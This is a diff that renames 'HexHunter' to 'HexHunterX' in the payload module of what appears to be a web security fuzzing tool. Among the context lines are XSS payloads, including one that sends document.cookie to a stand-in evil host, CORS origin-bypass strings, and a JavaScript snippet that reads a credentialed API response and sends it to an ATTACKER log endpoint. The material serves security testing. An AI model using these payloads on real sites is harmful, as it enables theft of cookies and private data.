@@ -1,5 +1,5 @@
-"""
-HexHunter -- Payload Injection Engine.
+﻿"""
+HexHunterX -- Payload Injection Engine.
 
 Context-aware payload generation with encoding support.
 Curated from community sources including OWASP, PayloadBox, and PayloadPlayground.
@@ -7,9 +7,9 @@ Curated from community sources including OWASP, PayloadBox, and PayloadPlaygroun
 
 import base64
 from urllib.parse import quote
-from utils.logger import HexHunterLogger
+from utils.logger import HexHunterXLogger
 
-logger = HexHunterLogger.get_logger("fuzzing.payloads")
+logger = HexHunterXLogger.get_logger("fuzzing.payloads")
 
 
 # --- Payload Databases -----------------------------------------------
@@ -57,7 +57,7 @@ XSS_PAYLOADS = [
     '&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
     # --- DOM-Based Probes ---
     '<script>document.write("<img src=x onerror=alert(1)>")</script>',
-    '"><script>document.location="https://evil.hexhunter.test/"+document.cookie</script>',
+    '"><script>document.location="https://evil.HexHunterX.test/"+document.cookie</script>',
     # --- Polyglot ---
     "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"
     '";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//'
@@ -327,12 +327,12 @@ CSRF_PAYLOADS = [
 
 CORS_PAYLOADS = [
     # --- Origin Headers to Test ---
-    "https://evil.hexhunter.test",
+    "https://evil.HexHunterX.test",
     "null",
-    "https://trusted.com.evil.hexhunter.test",
+    "https://trusted.com.evil.HexHunterX.test",
     "https://eviltrusted.com",
-    "https://trusted.com%60.evil.hexhunter.test",
-    "https://trusted.com%00.evil.hexhunter.test",
+    "https://trusted.com%60.evil.HexHunterX.test",
+    "https://trusted.com%00.evil.HexHunterX.test",
     # --- Exploitation PoC JS snippets ---
     'fetch("TARGET/api/sensitive",{credentials:"include"})'
     '.then(r=>r.text()).then(d=>fetch("https://ATTACKER/log?d="+btoa(d)))',
